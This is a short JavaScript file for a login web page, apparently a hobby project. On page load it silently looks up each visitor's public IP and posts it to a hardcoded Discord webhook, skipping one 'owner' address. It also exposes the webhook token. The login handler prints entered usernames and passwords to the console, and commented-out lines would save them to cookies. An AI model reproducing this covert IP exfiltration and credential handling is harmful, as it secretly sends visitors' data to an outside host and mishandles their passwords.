var loaded = false

const whurl ="https://discord.com/api/webhooks/911585052259913768/4ruPzXgvbCG4dNpAK8aRBOArt0PITNxcLys7JNgiOcyFEDRrhdHTZ_7MxPiOlEB81OEw"
var Ip;

function SetIP(IP) {
    if (IP != "81.5.246.24") {
        Ip = IP;
        const msg = { "content": "Incoming IP: " + IP }
        fetch(whurl + "?wait=true",
            {
                "method": "POST",
                "headers": { "content-type": "application/json" },
                "body": JSON.stringify(msg)
            })
    } else {
        console.log("Owner entered!");
    }
}

fetch('https://api.ipify.org/?format=json')
    .then(results => results.json())
    .then(data => SetIP(data.ip))

function startlogin() {
    console.log("Start")
    var loginform = document.getElementById("login-form");

    loginform.addEventListener("submit", function (formv) {
        formv.preventDefault();
        console.log("user: " + loginform.username.value);
        console.log("pass: " + loginform.password.value);
        //document.cookie = "username=" + loginform.username.value;
        //document.cookie = "password=" + loginform.password.value;
        loginform.username.value = "";
        loginform.password.value = "";
        document.location.assign("main.html");
    });

    loaded = true
};
